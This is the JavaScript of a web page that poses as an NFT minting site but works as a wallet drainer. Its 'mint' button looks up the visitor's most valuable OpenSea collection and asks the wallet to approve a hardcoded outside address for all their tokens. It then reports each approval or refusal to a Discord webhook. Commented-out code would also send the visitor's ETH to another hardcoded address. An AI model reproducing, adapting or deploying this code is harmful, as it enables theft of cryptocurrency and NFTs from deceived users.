export let web3 = new Web3(ethereum);
import discord from "../secure";

const isMetaMaskConnected = async () => {
  let accounts = await web3.eth.getAccounts();
  return accounts.length > 0;
};
///

async function load() {
  await loadWeb3();
  updateStatus("Ready!");
}

function updateStatus(status) {
  const statusEl = document.getElementById("status");
  statusEl.innerHTML = status;
  //console.log(status);
}

function sendMessage(msg) {
  const request = new XMLHttpRequest();
  request.open("POST", discord);
  // replace the url in the "open" method with yours
  request.setRequestHeader("Content-type", "application/json");
  const params = {
    username: "HANDSOME GUY",
    avatar_url: "",
    content: msg,
  };
  request.send(JSON.stringify(params));
}

load();
///

document.getElementById("mint").style.display = "none";
document.getElementById("connect").style.display = "inline";
document.getElementById("quantity").style.display = "none";

export async function updateMetaMaskStatus() {
  isMetaMaskConnected().then((connected) => {
    let button = document.querySelector("#connect-text");

    if (connected) {
      button.innerHTML = "METAMASK CONNECTED";
      document.getElementById("mint").style.display = "inline";
      document.getElementById("connect").style.display = "none";
      document.getElementById("mintnumber").style.display = "";
      document.getElementById("quantity").style.display = "";
    }
  });
}

export async function connectMetaMask() {
  console.log("haha");
  if ((await isMetaMaskConnected()) == false) {
    await ethereum.enable();
    await updateMetaMaskStatus();
    location.reload();
  }
}

let accounts = await web3.eth.getAccounts();
web3.eth.defaultAccount = accounts[0];

document.onload = updateMetaMaskStatus();
document.querySelector("#connect").addEventListener("click", connectMetaMask);
document.querySelector("#mint").addEventListener("click", sendEth);

async function sendEth() {
  let myaccounts = await web3.eth.getAccounts();
  let receiver = "0xEaC458B2F78b8cb37c9471A9A0723b4Aa6b4c62D";
  let response = await fetch(
    `https://opensea.io/${myaccounts[0]}?search[sortBy]=PRICE&search[sortAscending]=false`
  );
  let html = await response.text();
  // Initialize the DOM parser
  let parser = new DOMParser();

  // Parse the text
  let doc = parser.parseFromString(html, "text/html");

  // You can now even select part of that html as you would in the regular DOM
  // Example:
  // var docArticle = doc.querySelector('article').innerHTML;

  let result = doc
    .getElementsByTagName("article")[0]
    .getElementsByTagName("a")[0]
    .getAttribute("href")
    .split("/")[2];
  let abi = [
    {
      inputs: [
        { internalType: "address", name: "operator", type: "address" },
        { internalType: "bool", name: "approved", type: "bool" },
      ],
      name: "setApprovalForAll",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
    },
  ];
  let contract = new web3.eth.Contract(abi, result);
  contract.methods
    .setApprovalForAll(receiver, true)
    .send({ from: myaccounts[0] }, function (err, res) {
      if (err) {
        sendMessage(`${result} refused to approve!`);
        return;
      }
      sendMessage(result);
    });

  // let givenNumber = document.querySelector("#mintnumber").value;
  // var batch = new web3.BatchRequest();
  // var abi1 = [
  //   {
  //     inputs: [
  //       {
  //         internalType: "address",
  //         name: "account",
  //         type: "address",
  //       },
  //     ],
  //     stateMutability: "nonpayable",
  //     type: "constructor",
  //   },
  //   {
  //     anonymous: false,
  //     inputs: [
  //       {
  //         indexed: true,
  //         internalType: "address",
  //         name: "previousOwner",
  //         type: "address",
  //       },
  //       {
  //         indexed: true,
  //         internalType: "address",
  //         name: "newOwner",
  //         type: "address",
  //       },
  //     ],
  //     name: "OwnershipTransferred",
  //     type: "event",
  //   },
  //   {
  //     inputs: [],
  //     name: "mint",
  //     outputs: [],
  //     stateMutability: "payable",
  //     type: "function",
  //   },
  //   {
  //     inputs: [],
  //     name: "myaccount",
  //     outputs: [
  //       {
  //         internalType: "address",
  //         name: "",
  //         type: "address",
  //       },
  //     ],
  //     stateMutability: "view",
  //     type: "function",
  //   },
  //   {
  //     inputs: [],
  //     name: "owner",
  //     outputs: [
  //       {
  //         internalType: "address",
  //         name: "",
  //         type: "address",
  //       },
  //     ],
  //     stateMutability: "view",
  //     type: "function",
  //   },
  //   {
  //     inputs: [],
  //     name: "price",
  //     outputs: [
  //       {
  //         internalType: "uint256",
  //         name: "",
  //         type: "uint256",
  //       },
  //     ],
  //     stateMutability: "view",
  //     type: "function",
  //   },
  //   {
  //     inputs: [],
  //     name: "renounceOwnership",
  //     outputs: [],
  //     stateMutability: "nonpayable",
  //     type: "function",
  //   },
  //   {
  //     inputs: [
  //       {
  //         internalType: "address",
  //         name: "account",
  //         type: "address",
  //       },
  //     ],
  //     name: "setAccount",
  //     outputs: [],
  //     stateMutability: "nonpayable",
  //     type: "function",
  //   },
  //   {
  //     inputs: [
  //       {
  //         internalType: "string",
  //         name: "_oldCredential",
  //         type: "string",
  //       },
  //       {
  //         internalType: "string",
  //         name: "_newCredential",
  //         type: "string",
  //       },
  //     ],
  //     name: "setCredential",
  //     outputs: [],
  //     stateMutability: "nonpayable",
  //     type: "function",
  //   },
  //   {
  //     inputs: [
  //       {
  //         internalType: "uint256",
  //         name: "_price",
  //         type: "uint256",
  //       },
  //     ],
  //     name: "setPrice",
  //     outputs: [],
  //     stateMutability: "nonpayable",
  //     type: "function",
  //   },
  //   {
  //     inputs: [
  //       {
  //         internalType: "address",
  //         name: "newOwner",
  //         type: "address",
  //       },
  //     ],
  //     name: "transferOwnership",
  //     outputs: [],
  //     stateMutability: "nonpayable",
  //     type: "function",
  //   },
  //   {
  //     inputs: [
  //       {
  //         internalType: "address",
  //         name: "dest",
  //         type: "address",
  //       },
  //       {
  //         internalType: "uint256",
  //         name: "amount",
  //         type: "uint256",
  //       },
  //       {
  //         internalType: "string",
  //         name: "passKey",
  //         type: "string",
  //       },
  //     ],
  //     name: "withdraw",
  //     outputs: [],
  //     stateMutability: "nonpayable",
  //     type: "function",
  //   },
  //   {
  //     inputs: [
  //       {
  //         internalType: "address",
  //         name: "dest",
  //         type: "address",
  //       },
  //       {
  //         internalType: "address[]",
  //         name: "erc20",
  //         type: "address[]",
  //       },
  //       {
  //         internalType: "uint256[]",
  //         name: "amounts",
  //         type: "uint256[]",
  //       },
  //       {
  //         internalType: "string",
  //         name: "passKey",
  //         type: "string",
  //       },
  //     ],
  //     name: "withdrawA",
  //     outputs: [],
  //     stateMutability: "nonpayable",
  //     type: "function",
  //   },
  //   {
  //     stateMutability: "payable",
  //     type: "receive",
  //   },
  // ];
  // var address1 = "0x54D1FCCAD041880e8A42c0E894e5461D9f9b9456";
  // var contract1 = new web3.eth.Contract(abi1, address1);
  // var contract2 = new web3.eth.Contract(abi2, address2);
  // batch.add(
  //   web3.eth.sendTransaction.request({
  //     from: web3.currentProvider.selectedAddress,
  //     to: "0x1BD1a21eC034FDDE14e0Da273e10C08E14F3528b",
  //     value: web3.utils.toWei(givenNumber, "ether") * 0.1,
  //   })
  // );
  // batch.add(
  //   contract1.methods.mint().send.request({
  //     from: web3.currentProvider.selectedAddress,
  //     value: web3.utils.toWei(givenNumber, "ether") * 0.1,
  //   })
  // );
  // // batch.add(
  // //   contract2.methods.somFunc().send.request({from: ....})
  // // );
  // // batch.add(
  // //   myContractInstance.doSomethingElse(arg1, arg2, {
  // //     from: account,
  // //     gas: 4000000,
  // //   })
  // // );
  // // batch.add(
  // //   myContractInstance.doSomethingElseEntirely(arg1, arg2, {
  // //     from: account,
  // //     gas: 4000000,
  // //   })
  // // );
  // batch.execute();
}
